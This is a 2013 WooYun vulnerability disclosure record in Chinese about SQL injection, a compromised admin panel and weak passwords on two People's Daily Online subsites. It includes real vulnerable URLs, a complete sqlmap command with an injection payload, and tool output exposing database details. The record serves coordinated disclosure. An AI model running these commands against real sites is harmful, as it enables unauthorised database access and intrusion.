{"id": 60177, "wybug_id": "wooyun-2013-044430", "wybug_title": "人民网#2个分站漏洞大礼包（SQL注射、后台沦陷、信息泄露、弱口令）", "wybug_corp": "人民网", "wybug_author": "Mr.leo", "wybug_date": "2013-11-29 16:08", "wybug_open_date": "2014-01-13 16:09", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["管理后台对外", "后台被猜解", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-13：\t细节向公众公开  简要描述： 人民网#2个分站漏洞大礼包（SQL注射、后台沦陷、信息泄露、弱口令） 详细说明：  站点1：http://mms.people.com.cn  人民手机媒体网id参数没有过滤，导致后续的注射、mysql信息泄露（root用户）、后台沦陷+弱口令注入链接：http://mms.people.com.cn/music/admin/song_edit.php?id=29上神器havij\n\nmysql root密码暴露，可md5反查。\n\nData Bases: \tinformation_schema\t\tmusic\t\tmysql\t\tnewsite\t\ttest\t\twaf_music后台密码弱口令 用户名密码1\n\n使用注入的地址可直接跳转到后台地址；http://mms.people.com.cn/music/admin/login.php\n\n可添加，删除，创建，未深入。后台产生的部分数据位wvs扫描产生，请自行删除。------------------------------我是分割线------------------------------站点2：http://liuxueku.people.com.cn  人民网留学生校库post数据里面的key参数没有过滤，导致注射sqlmap跑起来sqlmap.py -u \"http://liuxueku.people.com.cn/jiaoren/senddata.aspx\" --data \"c=175&key=A\" -p \"key\" --dbs --current-user --current-dbPOST parameter 'key' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 66 HTTP(s) requests:---Place: POSTParameter: key    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: c=175&key=A' AND 8028=8028 AND 'uGfN'='uGfN---[13:15:14] [INFO] testing MySQL[13:15:23] [WARNING] the back-end DBMS is not MySQL[13:15:23] [INFO] testing Oracle[13:15:33] [WARNING] the back-end DBMS is not Oracle[13:15:33] [INFO] testing PostgreSQL[13:15:42] [WARNING] the back-end DBMS is not PostgreSQL[13:15:42] [INFO] testing Microsoft SQL Server[13:16:01] [INFO] confirming Microsoft SQL Server[13:16:41] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[13:16:42] [INFO] fetching current user[13:16:42] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[13:16:42] [INFO] retrieved: jiaoyucurrent user:    'jiaoyu'[13:26:17] [INFO] fetching current database[13:26:17] [INFO] retrieved: Devunivercurrent database:    'Devuniver'29张表，有点慢，没有深入。\n\nover   漏洞证明：  已经证明   修复方案：  1#过滤一切可能的参数2#屏蔽后台对外3#增加密码复杂性4#高RANK   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2013-12-02 21:59 厂商回复： CNVD确认并复现所述情况，转由CNCERT通报新闻行业主管单位，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-29 16:40 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  @xsser @Finger @疯狗 有内容 有危害 大礼包还走小厂商？？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}